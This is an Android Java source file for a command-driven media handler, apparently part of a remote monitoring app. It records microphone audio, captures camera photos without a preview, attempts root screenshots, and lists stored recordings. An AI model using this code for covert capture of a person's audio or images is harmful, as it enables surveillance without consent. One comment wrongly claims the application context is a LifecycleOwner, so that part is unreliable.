package com.idsiber.eye.handlers;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.util.Log;
import androidx.core.app.ActivityCompat;

// CameraX imports
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.core.Preview;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.camera.view.PreviewView;
import androidx.lifecycle.LifecycleOwner;
import com.google.common.util.concurrent.ListenableFuture;

import com.idsiber.eye.CommandResult;

import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import android.os.Handler;
import android.os.Looper;

/**
 * Handler untuk media dan recording (audio, foto, video)
 */
public class MediaHandler {
    private static final String TAG = "MediaHandler";
    private Context context;
    private MediaRecorder mediaRecorder;
    private Camera camera;
    private ImageCapture imageCapture;
    private String currentRecordingPath;
    private boolean isRecording = false;

    public MediaHandler(Context context) {
        this.context = context;
    }

    public CommandResult startAudioRecording(JSONObject params) {
        try {
            // Check audio permission (always required)
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                return new CommandResult(false, "Audio recording permission required", null);
            }
            
            // Check storage permission based on Android version
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Android 10+ uses scoped storage - we use app-specific directory which doesn't require permission
                // No permission check needed for app-specific directories on Android 10+
            } else {
                // Android 9 and below need WRITE_EXTERNAL_STORAGE for legacy storage
                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    return new CommandResult(false, "Storage permission required for Android 9 and below", null);
                }
            }

            if (isRecording) {
                return new CommandResult(false, "Recording already in progress", null);
            }

            // Create output directory - use app-specific directory for better compatibility
            File recordingsDir;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Use app-specific directory on Android 10+
                recordingsDir = new File(context.getExternalFilesDir(Environment.DIRECTORY_MUSIC), "IdSiberEye");
            } else {
                // Use legacy storage on Android 9 and below
                recordingsDir = new File(Environment.getExternalStorageDirectory(), "IdSiberEye/Recordings");
            }
            
            if (!recordingsDir.exists()) {
                if (!recordingsDir.mkdirs()) {
                    return new CommandResult(false, "Failed to create recordings directory", null);
                }
            }

            // Generate filename
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String filename = "audio_" + timestamp + ".3gp";
            currentRecordingPath = new File(recordingsDir, filename).getAbsolutePath();

            // Setup MediaRecorder
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(currentRecordingPath);

            // Get duration if specified
            int durationSeconds = params.optInt("duration", 0);
            if (durationSeconds > 0) {
                mediaRecorder.setMaxDuration(durationSeconds * 1000);
            }

            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;

            JSONObject result = new JSONObject();
            result.put("recording_path", currentRecordingPath);
            result.put("filename", filename);
            result.put("duration_limit", durationSeconds);

            Log.d(TAG, "Audio recording started: " + currentRecordingPath);
            return new CommandResult(true, "Audio recording started", result.toString());

        } catch (Exception e) {
            cleanup();
            return new CommandResult(false, "Failed to start audio recording: " + e.getMessage(), null);
        }
    }

    public CommandResult stopAudioRecording() {
        try {
            if (!isRecording || mediaRecorder == null) {
                return new CommandResult(false, "No recording in progress", null);
            }

            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;

            // Get file info
            File recordingFile = new File(currentRecordingPath);
            long fileSize = recordingFile.length();

            JSONObject result = new JSONObject();
            result.put("recording_path", currentRecordingPath);
            result.put("file_size", fileSize);
            result.put("file_exists", recordingFile.exists());

            Log.d(TAG, "Audio recording stopped: " + currentRecordingPath);
            return new CommandResult(true, "Audio recording stopped", result.toString());

        } catch (Exception e) {
            cleanup();
            return new CommandResult(false, "Failed to stop audio recording: " + e.getMessage(), null);
        }
    }

    public CommandResult takePhoto(JSONObject params) {
        try {
            // Check camera permission (always required)
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                return new CommandResult(false, "Camera permission required", null);
            }
            
            // Check storage permission based on Android version
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Android 10+ uses scoped storage - we use app-specific directory which doesn't require permission
                // No permission check needed for app-specific directories on Android 10+
            } else {
                // Android 9 and below need WRITE_EXTERNAL_STORAGE for legacy storage
                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    return new CommandResult(false, "Storage permission required for Android 9 and below", null);
                }
            }

            // Create output directory - use app-specific directory for better compatibility
            File photosDir;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Use app-specific directory on Android 10+ - no permission needed
                photosDir = new File(context.getExternalFilesDir(Environment.DIRECTORY_PICTURES), "IdSiberEye");
            } else {
                // Use legacy storage on Android 9 and below
                photosDir = new File(Environment.getExternalStorageDirectory(), "IdSiberEye/Photos");
            }
            
            if (!photosDir.exists()) {
                if (!photosDir.mkdirs()) {
                    return new CommandResult(false, "Failed to create photos directory", null);
                }
            }

            // Generate filename
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String filename = "photo_" + timestamp + ".jpg";
            String photoPath = new File(photosDir, filename).getAbsolutePath();

            // Determine camera to use (front or back)
            String cameraType = params.optString("camera", "back");
            int lensFacing;
            
            if (cameraType.equals("front")) {
                lensFacing = CameraSelector.LENS_FACING_FRONT;
            } else {
                lensFacing = CameraSelector.LENS_FACING_BACK;
            }

            // Use CameraX for modern Android devices
            try {
                final File photoFile = new File(photoPath);
                final CountDownLatch captureLatch = new CountDownLatch(1);
                final CommandResult[] resultHolder = new CommandResult[1];

                // Run CameraX operations on main thread
                Handler mainHandler = new Handler(Looper.getMainLooper());
                mainHandler.post(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            // Create output file options
                            ImageCapture.OutputFileOptions outputFileOptions = 
                                new ImageCapture.OutputFileOptions.Builder(photoFile).build();

                            // Setup image capture
                            imageCapture = new ImageCapture.Builder()
                                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                                .setJpegQuality(90)
                                .build();

                            // Get camera provider
                            ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(context);
                            cameraProviderFuture.addListener(() -> {
                                try {
                                    ProcessCameraProvider cameraProvider = cameraProviderFuture.get();

                                    // Select camera
                                    CameraSelector cameraSelector = new CameraSelector.Builder()
                                        .requireLensFacing(lensFacing)
                                        .build();

                                    // Bind use cases - use application context as LifecycleOwner
                                    cameraProvider.unbindAll();
                                    try {
                                        // Use application context which implements LifecycleOwner
                                        cameraProvider.bindToLifecycle((androidx.lifecycle.LifecycleOwner) context.getApplicationContext(), cameraSelector, imageCapture);
                                    } catch (Exception e) {
                                        Log.e(TAG, "Failed to bind camera to lifecycle: " + e.getMessage());
                                        resultHolder[0] = new CommandResult(false, "Failed to initialize camera: " + e.getMessage(), null);
                                        captureLatch.countDown();
                                        return;
                                    }

                                    // Take picture
                                    imageCapture.takePicture(outputFileOptions, 
                                        context.getMainExecutor(),
                                        new ImageCapture.OnImageSavedCallback() {
                                            @Override
                                            public void onImageSaved(ImageCapture.OutputFileResults outputFileResults) {
                                                if (photoFile.exists() && photoFile.length() > 0) {
                                                    try {
                                                        JSONObject result = new JSONObject();
                                                        result.put("photo_path", photoPath);
                                                        result.put("filename", filename);
                                                        result.put("file_size", photoFile.length());
                                                        result.put("camera_used", cameraType);
                                                        
                                                        resultHolder[0] = new CommandResult(true, "Photo captured successfully", result.toString());
                                                    } catch (Exception e) {
                                                        resultHolder[0] = new CommandResult(false, "Error creating result: " + e.getMessage(), null);
                                                    }
                                                } else {
                                                    resultHolder[0] = new CommandResult(false, "Photo file was not created", null);
                                                }
                                                captureLatch.countDown();
                                            }

                                            @Override
                                            public void onError(ImageCaptureException exception) {
                                                resultHolder[0] = new CommandResult(false, "Failed to capture photo: " + exception.getMessage(), null);
                                                captureLatch.countDown();
                                            }
                                        });

                                } catch (Exception e) {
                                    resultHolder[0] = new CommandResult(false, "Failed to initialize camera: " + e.getMessage(), null);
                                    captureLatch.countDown();
                                }
                            }, context.getMainExecutor());

                        } catch (Exception e) {
                            resultHolder[0] = new CommandResult(false, "Failed to setup camera: " + e.getMessage(), null);
                            captureLatch.countDown();
                        }
                    }
                });

                // Wait for capture to complete (max 15 seconds)
                if (!captureLatch.await(15, TimeUnit.SECONDS)) {
                    return new CommandResult(false, "Photo capture timeout", null);
                }

                if (resultHolder[0] != null) {
                    return resultHolder[0];
                } else {
                    return new CommandResult(false, "Photo capture failed", null);
                }

            } catch (Exception e) {
                return new CommandResult(false, "Failed to take photo with CameraX: " + e.getMessage(), null);
            }

        } catch (Exception e) {
            return new CommandResult(false, "Failed to take photo: " + e.getMessage(), null);
        }
    }

    public CommandResult takeScreenshot() {
        try {
            // Screenshot requires MediaProjection permission (Android 5+) or root access
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                return new CommandResult(false, "Screenshot requires MediaProjection permission or system app privileges", null);
            } else {
                // For older versions, try with shell command (requires root)
                try {
                    String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
                    String filename = "screenshot_" + timestamp + ".png";
                    String screenshotPath = Environment.getExternalStorageDirectory() + "/IdSiberEye/Screenshots/" + filename;
                    
                    // Create directory
                    File screenshotsDir = new File(Environment.getExternalStorageDirectory(), "IdSiberEye/Screenshots");
                    if (!screenshotsDir.exists()) {
                        screenshotsDir.mkdirs();
                    }

                    Process process = Runtime.getRuntime().exec("su -c screencap -p " + screenshotPath);
                    process.waitFor();

                    File screenshotFile = new File(screenshotPath);
                    if (screenshotFile.exists() && screenshotFile.length() > 0) {
                        JSONObject result = new JSONObject();
                        result.put("screenshot_path", screenshotPath);
                        result.put("filename", filename);
                        result.put("file_size", screenshotFile.length());

                        return new CommandResult(true, "Screenshot captured", result.toString());
                    } else {
                        return new CommandResult(false, "Screenshot file not created", null);
                    }
                } catch (Exception rootError) {
                    return new CommandResult(false, "Screenshot requires root access", null);
                }
            }
        } catch (Exception e) {
            return new CommandResult(false, "Failed to take screenshot: " + e.getMessage(), null);
        }
    }

    public CommandResult getRecordingStatus() {
        try {
            JSONObject status = new JSONObject();
            status.put("is_recording", isRecording);
            status.put("current_recording_path", currentRecordingPath != null ? currentRecordingPath : "");
            
            if (isRecording && currentRecordingPath != null) {
                File recordingFile = new File(currentRecordingPath);
                status.put("current_file_size", recordingFile.exists() ? recordingFile.length() : 0);
                status.put("file_exists", recordingFile.exists());
            }

            return new CommandResult(true, "Recording status retrieved", status.toString());
        } catch (Exception e) {
            return new CommandResult(false, "Failed to get recording status: " + e.getMessage(), null);
        }
    }

    public CommandResult listRecordings() {
        try {
            // Determine recordings directory based on Android version
            File recordingsDir;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Use app-specific directory on Android 10+
                recordingsDir = new File(context.getExternalFilesDir(Environment.DIRECTORY_MUSIC), "IdSiberEye");
            } else {
                // Use legacy storage on Android 9 and below
                recordingsDir = new File(Environment.getExternalStorageDirectory(), "IdSiberEye/Recordings");
            }
            
            JSONObject result = new JSONObject();
            
            if (!recordingsDir.exists()) {
                result.put("recordings", new org.json.JSONArray());
                result.put("total_files", 0);
                result.put("total_size", 0);
                result.put("directory_path", recordingsDir.getAbsolutePath());
                return new CommandResult(true, "No recordings found", result.toString());
            }

            File[] files = recordingsDir.listFiles();
            org.json.JSONArray recordings = new org.json.JSONArray();
            long totalSize = 0;

            if (files != null) {
                for (File file : files) {
                    if (file.isFile() && (file.getName().endsWith(".3gp") || file.getName().endsWith(".mp4") || file.getName().endsWith(".wav"))) {
                        JSONObject fileInfo = new JSONObject();
                        fileInfo.put("filename", file.getName());
                        fileInfo.put("path", file.getAbsolutePath());
                        fileInfo.put("size", file.length());
                        fileInfo.put("last_modified", file.lastModified());
                        fileInfo.put("last_modified_readable", new Date(file.lastModified()).toString());
                        
                        recordings.put(fileInfo);
                        totalSize += file.length();
                    }
                }
            }

            result.put("recordings", recordings);
            result.put("total_files", recordings.length());
            result.put("total_size", totalSize);
            result.put("directory_path", recordingsDir.getAbsolutePath());

            return new CommandResult(true, "Found " + recordings.length() + " recordings", result.toString());
        } catch (Exception e) {
            return new CommandResult(false, "Failed to list recordings: " + e.getMessage(), null);
        }
    }

    private void cleanup() {
        try {
            if (mediaRecorder != null) {
                try {
                    mediaRecorder.stop();
                } catch (Exception e) {
                    // Ignore stop errors during cleanup
                }
                mediaRecorder.release();
                mediaRecorder = null;
            }

            if (camera != null) {
                camera.release();
                camera = null;
            }

            isRecording = false;
            currentRecordingPath = null;
        } catch (Exception e) {
            Log.e(TAG, "Error during cleanup", e);
        }
    }

    public void onDestroy() {
        cleanup();
    }
}
